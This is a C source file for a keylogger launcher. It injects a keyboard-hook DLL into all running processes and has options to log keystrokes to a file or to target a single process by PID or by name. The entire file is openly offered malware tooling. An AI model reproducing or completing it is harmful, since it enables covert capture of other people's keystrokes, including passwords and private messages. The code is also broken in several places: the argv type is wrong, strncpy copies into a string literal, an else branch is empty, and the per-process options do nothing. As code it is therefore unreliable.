#include "injection_header.h"
#include "getopt.h"
#define KEYBOARD_HOOK_PATH "..\KeyBoardHook.dll" //If you want, change path.
#define MAX_FILE_NAME 260
int main(int argc, char* argv)
{
	const char* opt_pattern = "as:p:n:";
	char* log_file_name = "";
	int opt = 0;
	BOOL opt_filesave = FALSE;

	if (argc <= 1)
	{
		//if not input option, Just hook all process
		if (!InjectAllProcess(INJECTION_MODE, KEYBOARD_HOOK_PATH))
		{
			printf("Injection Failed!\n");
			exit(-1);
		}
		printf("All Process Hooked");
	}

	while ((opt = getopt(argc, argv, opt_pattern)) != -1)
	{
		switch (opt)
		{
		case 'a':
			if (!InjectAllProcess(INJECTION_MODE, KEYBOARD_HOOK_PATH))
			{
				printf("Injection Failed!\n");
				exit(-1);
			}
			printf("All Process Hookedn\n");
			break;
		case 's': //Save Log(if option argument exist, it's file name)
			opt_filesave = TRUE;
			if (optarg != NULL)
				strncpy(log_file_name, optarg, MAX_FILE_NAME);
			else
				//make log file name
			printf("Save Logging.\n");
			break;
		case 'p'://Hook one process. (option argument: PID) 
			printf("Hook Process: %s",optarg);
			break;
		case 'n'://Hook one process. (option argument: Process name) 
			printf("Hook Process By Name: %s",optarg);
			break;
		}
	}
}